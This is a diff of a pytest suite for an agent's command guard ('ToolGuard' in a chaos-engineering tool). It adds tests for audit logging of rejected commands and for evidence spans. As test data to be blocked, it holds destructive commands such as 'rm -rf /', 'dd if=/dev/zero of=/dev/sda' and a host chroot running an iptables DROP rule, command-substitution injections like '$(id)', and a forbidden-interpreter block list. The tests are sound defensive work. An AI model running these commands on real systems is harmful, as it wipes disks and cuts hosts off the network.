@@ -1181,11 +2358,14 @@ class TestToolGuardWizUnwrap:
         assert allowed is False
         assert "Dangerous pattern" in reason
 
-    @pytest.mark.parametrize("inner", [
-        "kubectl get pods; rm -rf /",          # ';' glued to the token before
-        "kubectl get pods;rm -rf /",           # glued on both sides
-        "kubectl get pods -n default; dd if=/dev/zero of=/dev/sda",
-    ])
+    @pytest.mark.parametrize(
+        "inner",
+        [
+            "kubectl get pods; rm -rf /",  # ';' glued to the token before
+            "kubectl get pods;rm -rf /",  # glued on both sides
+            "kubectl get pods -n default; dd if=/dev/zero of=/dev/sda",
+        ],
+    )
     def test_wiz_wrapped_glued_semicolon_blocked(self, inner):
         """A semicolon with no surrounding space must not slip the lift.
 
@@ -1203,6 +2383,7 @@ class TestToolGuardWizUnwrap:
     def test_wiz_wrapped_glued_semicolon_falls_back_to_generic(self):
         """Parser-level: the glued form must NOT be lifted."""
         from chaos_agent.tools.guard_parser import parse_command
+
         p = parse_command(self._wiz("kubectl get pods; rm -rf /"))
         # _parse_generic keeps the raw --command string as ONE checked token.
         assert any("; rm -rf /" in t for t in p.host_relevant_tokens())
@@ -1244,6 +2425,7 @@ class TestToolGuardWizUnwrap:
 
     def test_wiz_unwrap_parser_exempts_inner_container_command(self):
         from chaos_agent.tools.guard_parser import parse_command
+
         inner = "kubectl exec pod -n default -- sh -c 'echo hi >/dev/null'"
         p = parse_command(self._wiz(inner))
         assert p.binary == "wiz"
@@ -1275,8 +2457,14 @@ class TestToolGuardWizUnwrap:
             kube_context="",
         )
         args = [
-            "node/n1", "-it", "--image=ubuntu", "--",
-            "chroot", "/host", "sh", "-c",
+            "node/n1",
+            "-it",
+            "--image=ubuntu",
+            "--",
+            "chroot",
+            "/host",
+            "sh",
+            "-c",
             "iptables -I INPUT -j DROP >/dev/null 2>&1",
         ]
         cmd = build_kubectl_cmd("debug", args, settings=s)
@@ -1329,6 +2517,122 @@ class TestToolGuardAuditLog:
         assert log_data["exit_code"] == 0
         assert log_data["duration_ms"] == 123.4
         assert "timestamp" in log_data
+
+    def test_audit_rejection_format(self, caplog):
+        # Design 4.7: a rejection is a fact and gets recorded — the execution
+        # paths raise before audit_log can fire, so without this entry the
+        # guard's own interception left no trace.
+        guard = ToolGuard()
+        feedback = guard.evaluate(["curl", "http://x"])
+        assert feedback.allowed is False
+        with caplog.at_level(logging.INFO):
+            guard.audit_rejection(["curl", "http://x"], feedback)
+
+        assert len(caplog.records) == 1
+        log_data = json.loads(caplog.records[0].message)
+        assert log_data["rejected"] is True
+        assert log_data["command"] == ["curl", "http://x"]
+        assert log_data["constraint"] == "unknown_binary"
+        assert log_data["offending"] == "curl"
+        assert log_data["is_hard_floor"] is True
+        # Whitelist rejections carry no token-level evidence span.
+        assert log_data["evidence"] == []
+        assert "timestamp" in log_data
+
+    def test_audit_rejection_includes_evidence(self, caplog):
+        guard = ToolGuard()
+        cmd = ["kubectl", "get", "pods", "$(id)"]
+        feedback = guard.evaluate(cmd)
+        with caplog.at_level(logging.INFO):
+            guard.audit_rejection(cmd, feedback)
+
+        log_data = json.loads(caplog.records[0].message)
+        start = " ".join(cmd).find("$(id)")
+        assert log_data["evidence"] == [
+            {"start": start, "end": start + 5, "label": "command_substitution"}
+        ]
+
+
+class TestToolGuardEvidenceSpans:
+    """Evidence spans on the token-level rejection sites (design 4.7).
+
+    Spans index ``" ".join(cmd)`` — the display string audit / SSE / TUI
+    surfaces render — so a highlight layer can map them directly.
+    """
+
+    def setup_method(self):
+        self.guard = ToolGuard()
+
+    def test_solo_metachar_span(self):
+        cmd = ["kubectl", "get", "pods", ";", "ls"]
+        fb = self.guard.evaluate(cmd)
+        assert fb.allowed is False
+        assert len(fb.evidence) == 1
+        span = fb.evidence[0]
+        assert span.label == "shell_metacharacter"
+        assert " ".join(cmd)[span.start : span.end] == ";"
+
+    def test_blacklist_subst_span(self):
+        cmd = ["kubectl", "get", "pods", "$(id)"]
+        fb = self.guard.evaluate(cmd)
+        assert fb.allowed is False
+        assert fb.evidence[0].label == "command_substitution"
+        assert " ".join(cmd)[fb.evidence[0].start : fb.evidence[0].end] == "$(id)"
+
+    def test_blacklist_generic_label(self):
+        cmd = ["dd", "of=/dev/sda", "if=/dev/zero"]
+        fb = self.guard.evaluate(cmd)
+        assert fb.allowed is False
+        assert fb.evidence[0].label == "blacklist_pattern"
+        span = fb.evidence[0]
+        assert " ".join(cmd)[span.start : span.end] == "of=/dev/sda"
+
+    def test_span_never_lands_inside_sibling_arg(self):
+        # ``|`` also occurs inside the sibling argument ``a|b``; the span
+        # must point at the standalone offending element instead of at
+        # that unrelated substring (a bare ``find`` mis-highlighted
+        # position 13 — caught in self-review).
+        cmd = ["kubectl", "get", "a|b", "|"]
+        fb = self.guard.evaluate(cmd)
+        assert fb.allowed is False
+        assert len(fb.evidence) == 1
+        span = fb.evidence[0]
+        assert span.start == sum(len(p) + 1 for p in cmd[:3])
+        assert " ".join(cmd)[span.start : span.end] == "|"
+
+    def test_split_flag_value_span(self):
+        # The parser splits ``--msg=`id``` into ``--msg`` plus the value
+        # `` `id` `` — the value owns no argv element of its own, so its
+        # span is pinned to the slot right of the ``=`` in the joined
+        # parent element.
+        cmd = ["kubectl", "get", "pods", "--msg=`id`"]
+        fb = self.guard.evaluate(cmd)
+        assert fb.allowed is False
+        assert len(fb.evidence) == 1
+        span = fb.evidence[0]
+        assert span.label == "command_substitution"
+        assert " ".join(cmd)[span.start : span.end] == "`id`"
+
+    def test_blacklist_backtick_label(self):
+        # A standalone backtick token hits the `` `.*` `` pattern — same
+        # command_substitution label as the ``$(...)`` form.
+        cmd = ["kubectl", "get", "pods", "`id`"]
+        fb = self.guard.evaluate(cmd)
+        assert fb.allowed is False
+        assert fb.evidence[0].label == "command_substitution"
+        assert " ".join(cmd)[fb.evidence[0].start : fb.evidence[0].end] == "`id`"
+
+    def test_whitelist_rejection_carries_no_span(self):
+        # Binary / subcommand rejections name an identifier, not a dangerous
+        # structure — their evidence stays empty by design.
+        fb = self.guard.evaluate(["rm", "-rf", "/"])
+        assert fb.allowed is False
+        assert fb.evidence == ()
+
+    def test_allowed_has_no_evidence(self):
+        fb = self.guard.evaluate(["kubectl", "get", "pods"])
+        assert fb.allowed is True
+        assert fb.evidence == ()
 
 
 class TestCommandResult:
@@ -1436,8 +2740,19 @@ class TestGuardProviderAggregation:
 
         FaultProviderRegistry.clear()
         FaultProviderRegistry.register_builtins()
-        forbidden = {"sh", "bash", "zsh", "python", "python3", "perl", "ruby",
-                     "node", "env", "eval", "exec"}
+        forbidden = {
+            "sh",
+            "bash",
+            "zsh",
+            "python",
+            "python3",
+            "perl",
+            "ruby",
+            "node",
+            "env",
+            "eval",
+            "exec",
+        }
         for provider in FaultProviderRegistry.all_providers():
             assert set(provider.injection_binaries) & forbidden == set()
         assert ToolGuard._default_allowed_commands() & forbidden == set()
